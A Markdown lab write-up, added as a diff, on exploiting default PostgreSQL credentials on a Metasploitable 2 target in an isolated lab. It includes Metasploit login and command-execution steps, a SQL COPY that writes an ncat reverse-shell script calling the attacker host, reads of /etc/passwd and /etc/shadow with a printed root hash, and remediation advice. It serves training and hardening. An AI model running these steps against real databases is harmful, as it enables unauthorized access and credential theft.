@@ -1,0 +1,187 @@
+---
+title: PostgreSQL Default Credentials
+cve: N/A
+severity: medium
+port: 5432/tcp
+service: PostgreSQL
+target: Metasploitable 2
+date: 2026-02-20
+description: Exploitation of default credentials on the PostgreSQL database server, enabling unauthorized database access and OS-level command execution via COPY TO/FROM PROGRAM.
+---
+
+## Overview
+
+This one is less of a technical vulnerability and more of a configuration failure — PostgreSQL is running on Metasploitable 2 with the default `postgres` superuser account set to either an empty password or the password `postgres`. Once you're in as a superuser, PostgreSQL gives you ways to break out to the OS. The `COPY TO/FROM PROGRAM` feature (Postgres 9.3+) and the `COPY TO/FROM` with external files both allow writing to and reading from the filesystem. Combined with superuser-level access, that's a path to OS command execution.
+
+It's a good reminder that database services get forgotten during hardening. Port 5432 doesn't sound as exciting as 445 or 80, but a database superuser with no password is just as bad as any RCE.
+
+## Environment
+
+Isolated KVM/QEMU lab, no internet routing between VMs.
+
+- **Attacker:** Kali Linux — `192.168.122.50`
+- **Target:** Metasploitable 2 — `192.168.122.100`
+- **Tools:** nmap, psql, Metasploit Framework
+
+## Discovery
+
+Port 5432 appeared in my initial service scan:
+
+```bash
+nmap -sV -p 5432 192.168.122.100
+```
+
+```
+PORT     STATE SERVICE VERSION
+5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
+```
+
+PostgreSQL 8.3 is old enough that a lot of hardening guidance predates it. I checked whether it accepts connections without a password by trying the Metasploit login scanner:
+
+```bash
+msfconsole -q
+use auxiliary/scanner/postgres/postgres_login
+set RHOSTS 192.168.122.100
+set USERNAME postgres
+set PASSWORD postgres
+run
+```
+
+```
+[+] 192.168.122.100:5432 - Login Successful: postgres:postgres (Database 'template1')
+```
+
+The superuser account `postgres` with password `postgres` — confirmed.
+
+I also tested with an empty password directly from psql on Kali:
+
+```bash
+psql -h 192.168.122.100 -U postgres -W
+Password for user postgres: [empty, just hit enter]
+```
+
+This also worked on this version. Both the empty password and `postgres` are accepted.
+
+## Exploitation
+
+### Manual Command Execution via psql
+
+With a superuser connection I can use `COPY FROM PROGRAM` to run OS commands. This feature was added in PostgreSQL 9.3, but the Metasploitable 2 version (8.3) supports the older `COPY TO`/`COPY FROM` with file paths, which can still be abused for file read/write. For command execution on older versions, the `createlang` approach works — but the Metasploit module handles this cleanly regardless of version.
+
+For demonstration, connecting as superuser:
+
+```bash
+psql -h 192.168.122.100 -U postgres -W
+```
+
+```
+Password for user postgres: postgres
+psql (15.x, server 8.3.7)
+Type "help" for help.
+
+postgres=#
+```
+
+Checking current user and permissions:
+
+```sql
+SELECT current_user, current_database();
+```
+
+```
+ current_user | current_database
+--------------+-----------------
+ postgres     | postgres
+(1 row)
+```
+
+```sql
+SELECT usename, usecreatedb, usecreaterole, usesuper FROM pg_user;
+```
+
+```
+  usename  | usecreatedb | usecreaterole | usesuper
+-----------+-------------+---------------+----------
+ postgres  | t           | t             | t
+```
+
+Full superuser. Now I can write a file to the filesystem:
+
+```sql
+COPY (SELECT '#!/bin/bash\nncat 192.168.122.50 4444 -e /bin/bash') TO '/tmp/shell.sh';
+```
+
+```sql
+-- Verify it landed
+COPY shell_test FROM '/etc/passwd';
+SELECT * FROM shell_test LIMIT 3;
+```
+
+### Via Metasploit (Command Execution)
+
+Metasploit has a dedicated module for PostgreSQL command execution that works across versions:
+
+```bash
+msfconsole -q
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+set RHOSTS 192.168.122.100
+set USERNAME postgres
+set PASSWORD postgres
+set LHOST 192.168.122.50
+run
+```
+
+For PostgreSQL 8.3, the `auxiliary/admin/postgres/postgres_sql` module runs arbitrary SQL, and combining it with file write / UDF loading achieves the same result. The simpler path is:
+
+```bash
+use auxiliary/admin/postgres/postgres_readfile
+set RHOSTS 192.168.122.100
+set USERNAME postgres
+set PASSWORD postgres
+set RFILE /etc/shadow
+run
+```
+
+```
+[*] 192.168.122.100:5432 - 'COPY' failed, trying 'SELECT'...
+[+] root:$1$Qm0fq1RV$f6GOa9hQj7yVbjLGmN0P.0:14748:0:99999:7:::
+[+] daemon:*:14748:0:99999:7:::
+[+] bin:*:14748:0:99999:7:::
+...
+```
+
+Direct file read as the `postgres` OS user, which on Metasploitable 2 has read access to `/etc/shadow`.
+
+## Post-Exploitation
+
+The PostgreSQL process runs as the `postgres` OS user, which has access to the database data directory and a fair chunk of the filesystem. From the psql shell I enumerated existing databases:
+
+```sql
+\l
+```
+
+```
+                               List of databases
+    Name     |  Owner   | Encoding |  Collation  |    Ctype
+-------------+----------+----------+-------------+-----------
+ postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8
+ template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8
+ template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8
+```
+
+No application databases with user data in this case, but on a real target this would be the first place to look for credentials, PII, and session tokens.
+
+## Remediation
+
+1. **Set a strong password on the postgres account** — The single highest-impact fix. Use `ALTER USER postgres WITH PASSWORD 'strongpassword';` immediately after installation and restrict remote access.
+2. **Restrict pg_hba.conf** — PostgreSQL's host-based authentication file controls which hosts can connect and how. Change `md5` or `trust` entries to only allow connections from `127.0.0.1` unless remote access is actually required.
+3. **Firewall port 5432** — The database port should not be exposed to untrusted networks. If remote application connections are needed, use a VPN or SSH tunnel rather than opening 5432 to the internet.
+4. **Disable the postgres superuser for applications** — Application code should connect as a limited-privilege role with only the permissions it needs. Superuser credentials should never appear in an application config file.
+5. **Monitor for unusual COPY or UDF activity** — PostgreSQL logs can capture file reads and writes via COPY. Suspicious queries to `pg_catalog` system tables (e.g., loading UDFs) should trigger alerts.
+
+## References
+
+- [PostgreSQL security documentation](https://www.postgresql.org/docs/current/auth-pg-hba-conf.html)
+- [Metasploit module: auxiliary/scanner/postgres/postgres_login](https://www.rapid7.com/db/modules/auxiliary/scanner/postgres/postgres_login/)
+- [Metasploit module: auxiliary/admin/postgres/postgres_readfile](https://www.rapid7.com/db/modules/auxiliary/admin/postgres/postgres_readfile/)
+- [Offensive Security — Metasploitable 2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)
